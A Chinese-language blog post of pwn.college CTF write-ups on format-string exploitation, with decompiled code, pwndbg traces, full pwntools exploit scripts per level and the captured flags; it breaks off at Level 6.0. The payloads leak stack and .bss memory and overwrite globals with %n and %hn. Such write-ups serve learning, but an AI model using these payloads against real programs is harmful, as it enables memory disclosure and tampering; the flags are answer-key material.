---
title: "High Speed Hoisting"
published: 2025-01-29
updated: 2025-02-05
description: "Crux of initial processing of javascript programs"
tags: ["javaScript", "Notes"]
category: "FrontEnd"
draft: false
---

<!-- explain about hoisting in depth here -->

# 前言

> It's a thrilling intellectual puzzle, unlocking the secrets of a program from the inside out.
>
> ~Description 你别吓我，万一我 IQ 没及格怎么办？那不是炸了？？~

玩点简单的 (probably)？智力游戏吧～**_泄漏/篡改数据神技_**，小子，是不是应该学透彻？

# Level 1.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to reveal a string stored on the stack.

## Write-up

```c {16-25} ins={58-65} del={49, 55} collapse={1-12, 29-45, 69-71}
unsigned __int64 func()
{
  unsigned int v0; // eax
  int v1; // eax
  _BYTE v3[456]; // [rsp+0h] [rbp-1E0h] BYREF
  unsigned __int64 v4; // [rsp+1C8h] [rbp-18h]
  __int64 savedregs; // [rsp+1E0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+1E8h] [rbp+8h] BYREF

  v4 = __readfsqword(0x28u);
  sp_ = (__int64)v3;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - v3) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  memset(&v3[16], 0, 0x1B0uLL);
  v0 = time(0LL);
  srand(v0);
  *(_DWORD *)&v3[112] = 0;
  while ( *(int *)&v3[112] <= 14 )
  {
    v3[*(int *)&v3[112]] = rand() % 26 + 65;
    ++*(_DWORD *)&v3[112];
  }
  v3[15] = 0;
  *(_QWORD *)&v3[80] = v3;
  puts("There is a 15-character uppercase secret password hidden on the stack!");
  puts("If you find it, you will be given the flag!");
  putchar(10);
  printf("The secret password is located at %p and the stack pointer is located at %p.\n", &v3[80], (const void *)sp_);
  printf(
    "The difference between these addresses is: %d (%d / 8).\n",
    (unsigned __int64)&v3[-sp_ + 80] >> 3,
    (unsigned int)&v3[-sp_ + 80]);
  printf("This means, before the printf, the arguments to the format string will look something like:\n");
  printf("%p:\t[SECRET_PASSWORD]\n", &v3[80]);
  *(_DWORD *)&v3[112] = 0;
  while ( *(int *)&v3[112] < (unsigned __int64)&v3[-sp_ + 80] >> 3 )
  {
    printf("%p:\t[?]\n", &v3[-8 - 8LL * *(int *)&v3[112] + 80]);
    ++*(_DWORD *)&v3[112];
  }
  puts("R9:\t\t[?]");
  puts("R8:\t\t[?]");
  puts("RCX:\t\t[?]");
  puts("RDX:\t\t[?]");
  puts("RSI:\t\t[?]");
  puts("RDI:\t\t[FORMAT_STRING]");
  printf("I will now read up to %d bytes. Send your data!\n", 256);
  *(_DWORD *)&v3[116] = read(0, &v3[149], 0x100uLL);
  v3[*(int *)&v3[116] + 149] = 0;
  printf("Received %d bytes!\n", *(_DWORD *)&v3[116]);
  putchar(10);
  printf("I will now call printf on your data!\n");
  putchar(10);
  printf(&v3[149], 256LL);
  putchar(10);
  puts("What is the secret password?");
  *(_DWORD *)&v3[116] = read(0, &v3[96], 0xFuLL);
  v3[*(int *)&v3[116] + 96] = 0;
  if ( !strcmp(*(const char **)&v3[80], &v3[96]) )
  {
    puts("Correct Password!");
    v1 = open("/flag", 0);
    sendfile(1, v1, 0LL, 0x400uLL);
  }
  else
  {
    puts("Wrong Password!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

第一题，核心伪代码如上，会随机生成一串字符串到栈上某个位置，绿色部分会判断输入是否和栈上的随机字符串相符，成立则输出 flag。

红色部分直接把输入作为 `printf()` 的 `const char *format` 参数，是一个很明显的格式化字符串漏洞。

再简单计算一下随机字符串在栈上第几位，加上 6 (`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`) 就是我们需要泄漏的参数位了。

```asm wrap=false showLineNumbers=false
Breakpoint 1, 0x00005b65398e08db in func ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
 RBX  0x7ffe30164a18 —▸ 0x7ffe3016677b ◂— '/home/cub3y0nd/Projects/pwn.college/babyfmt_level1.0'
 RCX  0x7b2b06f98a21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7ffe30164740 ◂— 0xa /* '\n' */
 RDI  0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
 RSI  0x7ffe30164740 ◂— 0xa /* '\n' */
 R8   0x64
 R9   0xffffffff
 R10  0
 R11  0x246
 R12  1
 R13  0
 R14  0x7b2b070e5000 (_rtld_global) —▸ 0x7b2b070e62e0 —▸ 0x5b65398df000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffe301648c0 —▸ 0x7ffe301648f0 —▸ 0x7ffe30164990 —▸ 0x7ffe301649f0 ◂— 0
 RSP  0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
 RIP  0x5b65398e08db (func+936) ◂— call strcmp@plt
─────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x5b65398e08db <func+936>    call   strcmp@plt                  <strcmp@plt>
        s1: 0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
        s2: 0x7ffe30164740 ◂— 0xa /* '\n' */

   0x5b65398e08e0 <func+941>    test   eax, eax
   0x5b65398e08e2 <func+943>    jne    func+1005                   <func+1005>

   0x5b65398e08e4 <func+945>    lea    rdi, [rip + 0xa60]     RDI => 0x5b65398e134b ◂— 'Correct Password!'
   0x5b65398e08eb <func+952>    call   puts@plt                    <puts@plt>

   0x5b65398e08f0 <func+957>    mov    esi, 0                 ESI => 0
   0x5b65398e08f5 <func+962>    lea    rdi, [rip + 0xa61]     RDI => 0x5b65398e135d ◂— 0x72570067616c662f /* '/flag' */
   0x5b65398e08fc <func+969>    mov    eax, 0                 EAX => 0
   0x5b65398e0901 <func+974>    call   open@plt                    <open@plt>

   0x5b65398e0906 <func+979>    mov    ebx, eax
   0x5b65398e0908 <func+981>    mov    ecx, 0x400             ECX => 0x400
───────────────────────────────────[ STACK ]───────────────────────────────────
00:0000│ rax rdi rsp 0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
01:0008│-1d8         0x7ffe301646e8 ◂— 0x51485748424d52 /* 'RMBHWHQ' */
02:0010│-1d0         0x7ffe301646f0 ◂— 0
... ↓                5 skipped
─────────────────────────────────[ BACKTRACE ]─────────────────────────────────
 ► 0   0x5b65398e08db func+936
   1   0x5b65398e0a53 main+264
   2   0x7b2b06eb2e08 None
   3   0x7b2b06eb2ecc __libc_start_main+140
   4   0x5b65398e022e _start+46
───────────────────────────────────────────────────────────────────────────────
pwndbg> stack 30
00:0000│ rax rdi rsp 0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
01:0008│-1d8         0x7ffe301646e8 ◂— 0x51485748424d52 /* 'RMBHWHQ' */
02:0010│-1d0         0x7ffe301646f0 ◂— 0
... ↓                7 skipped
0a:0050│-190         0x7ffe30164730 —▸ 0x7ffe301646e0 ◂— 'XJHHXBRPRMBHWHQ'
0b:0058│-188         0x7ffe30164738 ◂— 0
0c:0060│ rdx rsi     0x7ffe30164740 ◂— 0xa /* '\n' */
0d:0068│-178         0x7ffe30164748 ◂— 0
0e:0070│-170         0x7ffe30164750 ◂— 0x10000000a /* '\n' */
0f:0078│-168         0x7ffe30164758 ◂— 0
... ↓                2 skipped
12:0090│-150         0x7ffe30164770 ◂— 0xa0000000000
13:0098│-148         0x7ffe30164778 ◂— 0
... ↓                10 skipped
pwndbg> dist 0x7ffe30164730 $rsp
0x7ffe30164730->0x7ffe301646e0 is -0x50 bytes (-0xa words)
pwndbg> p/d 0x50/8+6
$1 = 16
```

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level1.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(leak_offset):
    payload = f"%{leak_offset}$s".encode()

    return payload


def attack(target):
    try:
        payload = construct_payload(16)

        target.send(payload)
        target.recvuntil(b"I will now call printf on your data!\n\n")

        password = target.recv(0xF)
        target.sendafter(b"What is the secret password?\n", password)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch() as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{UGd_h1EnEGQDMhB1PSrD81fSSXs.dZTM0MDL5cTNxgzW}`

# Level 1.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to reveal a string stored on the stack.

## Write-up

参见 [Level 1.0](#level-10)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level1.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(leak_offset):
    payload = f"%{leak_offset}$s".encode()

    return payload


def attack(target):
    try:
        payload = construct_payload(10)

        target.send(payload)
        target.recvuntil(b"I will now call printf on your data!\n\n")

        password = target.recv(0xF)
        target.sendafter(b"What is the secret password?\n", password)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch() as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{UQu4aFVleX5KV74QVvgMLBddqc-.ddTM0MDL5cTNxgzW}`

# Level 2.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to reveal a string stored on the stack.

## Write-up

```asm wrap=false showLineNumbers=false
Breakpoint 1, 0x00005a05148a88fe in func ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  0x7ffe6d89d0a0 ◂— 'VCOMITKAHQHVEVP'
 RBX  0x7ffe6d89d438 —▸ 0x7ffe6d89e77b ◂— '/home/cub3y0nd/Projects/pwn.college/babyfmt_level2.0'
 RCX  0x71da28ecea21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7ffe6d89d0b0 ◂— 0xa /* '\n' */
 RDI  0x7ffe6d89d0a0 ◂— 'VCOMITKAHQHVEVP'
 RSI  0x7ffe6d89d0b0 ◂— 0xa /* '\n' */
 R8   0x64
 R9   0xffffffff
 R10  0
 R11  0x246
 R12  1
 R13  0
 R14  0x71da2901b000 (_rtld_global) —▸ 0x71da2901c2e0 —▸ 0x5a05148a7000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffe6d89d2e0 —▸ 0x7ffe6d89d310 —▸ 0x7ffe6d89d3b0 —▸ 0x7ffe6d89d410 ◂— 0
 RSP  0x7ffe6d89d040 ◂— 0x800000
 RIP  0x5a05148a88fe (func+971) ◂— call strcmp@plt
─────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x5a05148a88fe <func+971>     call   strcmp@plt                  <strcmp@plt>
        s1: 0x7ffe6d89d0a0 ◂— 'VCOMITKAHQHVEVP'
        s2: 0x7ffe6d89d0b0 ◂— 0xa /* '\n' */

   0x5a05148a8903 <func+976>     test   eax, eax
   0x5a05148a8905 <func+978>     jne    func+1040                   <func+1040>

   0x5a05148a8907 <func+980>     lea    rdi, [rip + 0xaad]     RDI => 0x5a05148a93bb ◂— 'Correct Password!'
   0x5a05148a890e <func+987>     call   puts@plt                    <puts@plt>

   0x5a05148a8913 <func+992>     mov    esi, 0                 ESI => 0
   0x5a05148a8918 <func+997>     lea    rdi, [rip + 0xaae]     RDI => 0x5a05148a93cd ◂— 0x72570067616c662f /* '/flag' */
   0x5a05148a891f <func+1004>    mov    eax, 0                 EAX => 0
   0x5a05148a8924 <func+1009>    call   open@plt                    <open@plt>

   0x5a05148a8929 <func+1014>    mov    ebx, eax
   0x5a05148a892b <func+1016>    mov    ecx, 0x400             ECX => 0x400
───────────────────────────────────[ STACK ]───────────────────────────────────
00:0000│ rsp 0x7ffe6d89d040 ◂— 0x800000
01:0008│-298 0x7ffe6d89d048 —▸ 0x7ffe6d89d0a0 ◂— 'VCOMITKAHQHVEVP'
02:0010│-290 0x7ffe6d89d050 ◂— 0
... ↓        5 skipped
─────────────────────────────────[ BACKTRACE ]─────────────────────────────────
 ► 0   0x5a05148a88fe func+971
   1   0x5a05148a8a76 main+264
   2   0x71da28de8e08 None
   3   0x71da28de8ecc __libc_start_main+140
   4   0x5a05148a822e _start+46
───────────────────────────────────────────────────────────────────────────────
pwndbg> x/2gx 0x7ffe6d89d0a0
0x7ffe6d89d0a0: 0x414b54494d4f4356 0x0050564556485148
pwndbg> x/s 0x7ffe6d89d0a0
0x7ffe6d89d0a0: "VCOMITKAHQHVEVP"
pwndbg> dist $rdi $rsp
0x7ffe6d89d0a0->0x7ffe6d89d040 is -0x60 bytes (-0xc words)
pwndbg> p/d 0x60/8+6
$1 = 18
```

这次我剑走偏锋，不用 `%s` 了，而是尝试用更麻烦一点的 `%llx` 输出栈上保存的随机字符串值，转换为 ASCII。因为小端序，所以还需要再反转一下。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote, unhex

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level2.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload():
    payload = b"%18$llx%19$llx"

    return payload


def attack(target):
    try:
        payload = construct_payload()

        target.send(payload)
        target.recvuntil(b"I will now call printf on your data!\n\n")

        password = flat(
            unhex(target.recv(2 * 8))[::-1],
            unhex(target.recv(2 * 7))[::-1],
        )

        target.sendafter(b"What is the secret password?\n", password)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch() as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{QZG8MJMHwVhFNzjDx4guy6MBfEL.dhTM0MDL5cTNxgzW}`

# Level 2.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to reveal a string stored on the stack.

## Write-up

参见 [Level 2.0](#level-20)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote, unhex

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level2.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload():
    payload = b"%18$llx%19$llx"

    return payload


def attack(target):
    try:
        payload = construct_payload()

        target.send(payload)
        target.recvuntil(b"I will now call printf on your data!\n\n")

        password = flat(
            unhex(target.recv(2 * 8))[::-1],
            unhex(target.recv(2 * 7))[::-1],
        )

        target.sendafter(b"What is the secret password?\n", password)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch() as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{MjTMloC44qXLBonimJ5i3Zq3ux-.dlTM0MDL5cTNxgzW}`

# Level 3.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to read the flag directly from the .bss section.

## Write-up

这题直接把 flag 读到 `.bss` 段了，所以思路很简单，就是把 `.bss` 的地址写到栈上某个位置，然后通过 `%s` 解引用输出这个地址的值。

注意一定是先输入 fmtstr 再接地址，这个应该不需要解释吧。

遇事别慌多调试，~_debugger 是你的 gf，你还不懂吗。_~

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level3.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+436
b *func+549
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position, data_offset):
    return flat(
        f"aaa%{position}$s\x00",
        elf.bss() + data_offset,
    )


def attack(target):
    try:
        payload = construct_payload(16, 0x70)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{coYB13XxKYo3asb6os4GxIefmpC.dBjM0MDL5cTNxgzW}`

# Level 3.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to read the flag directly from the .bss section.

## Write-up

参见 [Level 3.0](#level-30)。

睡了一天为什么还是好困，不写了，睡觉觉，在想明天或者以后要不要写一个技巧向专题？明天得学学 `ret2csu` 和 `SROP`。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level3.1"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+310
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position, data_offset):
    return flat(
        f"%{position}$s\x00",
        elf.bss() + data_offset,
    )


def attack(target):
    try:
        payload = construct_payload(20, 0x90)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{UtDc1WIH6qas-RrhigjZpPLWMUP.dFjM0MDL5cTNxgzW}`

# Level 4.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to set a global variable.

## Write-up

```c ins={8-10} collapse={1-4}
int check_win()
{
  int v0; // eax

  puts("Checking win value...");
  printf("... desired win value: %#lx\n", 194LL);
  printf("... written win value: %#lx\n", qword_404160);
  if ( qword_404160 != 0xC2 )
    return puts("... INCORRECT!");
  puts("... SUCCESS! Here is your flag:");
  v0 = open("/flag", 0);
  return sendfile(1, v0, 0LL, 0x80uLL);
}
```

简单，通过逆向我们知道，`check_win()` 输出 flag 的条件是 `.bss` 段上的 `qword_404160` 变量值为 `0xC2`，为了满足这一条件，我们直接用 `%n` 篡改即可。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level4.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+293
b *check_win+77
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position, var_offset):
    return flat(
        f"aaaa%190x%{position}$n\x00".encode("ascii"),
        elf.bss() + var_offset,
    )


def attack(target):
    try:
        payload = construct_payload(29, 0xC0)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{MrJaEVG2FM1QGKYUbL8GjOyBkhg.dJjM0MDL5cTNxgzW}`

# Level 4.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to set a global variable.

## Write-up

参见 [Level 4.0](#level-40)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level4.1"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+191
b *check_win+77
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position, var_offset):
    return flat(
        f"aaaaa%116x%{position}$n\x00".encode("ascii"),
        elf.bss() + var_offset,
    )


def attack(target):
    try:
        payload = construct_payload(30, 0x40)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{gYbZ_KMoDIuA2cpDPTK3F8hxiEo.dNjM0MDL5cTNxgzW}`

# Level 5.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to set a larger global variable.

## Write-up

```c ins={8-10} collapse={1-4}
int check_win()
{
  int v0; // eax

  puts("Checking win value...");
  printf("... desired win value: %#lx\n", 0x82802F819C27A46ALL);
  printf("... written win value: %#lx\n", qword_4040F8);
  if ( qword_4040F8 != 0x82802F819C27A46ALL )
    return puts("... INCORRECT!");
  puts("... SUCCESS! Here is your flag:");
  v0 = open("/flag", 0);
  return sendfile(1, v0, 0LL, 0x80uLL);
}
```

WHAT CAN I SAY...WHAT U WANT ME TO SAY...

对于这种巨大的数值的策略是我们可以分组写，按 2 字节一组应该是不错的选项。第一组写起来应该是没有任何坑的，注意栈对齐加减字节即可；第二组开始则应该减去前一组写入的字节数再 `% 0x10000`，这是为了回环到 `[0x00, 0xFF]` 这个区间，这样就确保了 `%n` 写入的是我们期望的值。

评价一下我的码风好不好看 [1/31/2025](https://memos.cubeyond.net/m/jomRvQVoucVd8FsyYkpygn)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level5.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+315
b *check_win+82
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position, var_offset):
    parts = [0xA46A, 0x9C27, 0x2F81, 0x8280]

    align_stack = b"a" * 0x3
    align_offset = len(align_stack)

    fmtstr = (
        b"".join(
            f"%{(parts[i] - (align_offset if i == 0 else parts[i - 1])) % 0x10000}x%{position + i}$hn".encode(
                "ascii"
            )
            for i in range(len(parts))
        )
        + b"\x00"
    )
    addresses = [elf.bss() + var_offset + (0x2 * i) for i in range(4)]

    return flat(
        align_stack,
        fmtstr,
        *addresses,
    )


def attack(target):
    try:
        payload = construct_payload(45, 0x58)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{wRZzRCQlIP6gytdVI6FYHhTLMom.dRjM0MDL5cTNxgzW}`

# Level 5.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to set a larger global variable.

## Write-up

参见 [Level 5.0](#level-50)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level5.1"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+213
b *check_win+82
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position, var_offset):
    parts = [0x15C7, 0x32CC, 0x2869, 0x2872]

    align_stack = b"a" * 0x6
    align_offset = len(align_stack)

    fmtstr = (
        b"".join(
            f"%{(parts[i] - (align_offset if i == 0 else parts[i - 1])) % 0x10000}x%{position + i}$hn".encode(
                "ascii"
            )
            for i in range(len(parts))
        )
        + b"\x00"
    )
    addresses = [elf.bss() + var_offset + (0x2 * i) for i in range(4)]

    return flat(
        align_stack,
        fmtstr,
        *addresses,
    )


def attack(target):
    try:
        payload = construct_payload(39, 0xA8)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{sjfLqAt2jCG0OYV91dJi9052Hf4.dVjM0MDL5cTNxgzW}`

# Level 6.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to copy a value and overwrite a global variable.

## Write-up

```c ins={16-17, 44} del={35-36, 41} collapse={1-12, 21-31}
unsigned __int64 func()
{
  int v0; // eax
  unsigned int v1; // eax
  _QWORD v3[63]; // [rsp+0h] [rbp-200h] BYREF
  unsigned __int64 v4; // [rsp+1F8h] [rbp-8h]
  __int64 savedregs; // [rsp+200h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+208h] [rbp+8h] BYREF

  v4 = __readfsqword(0x28u);
  sp_ = (__int64)v3;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v3) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  memset(v3, 0, sizeof(v3));
  v0 = open("/dev/urandom", 0, v3);
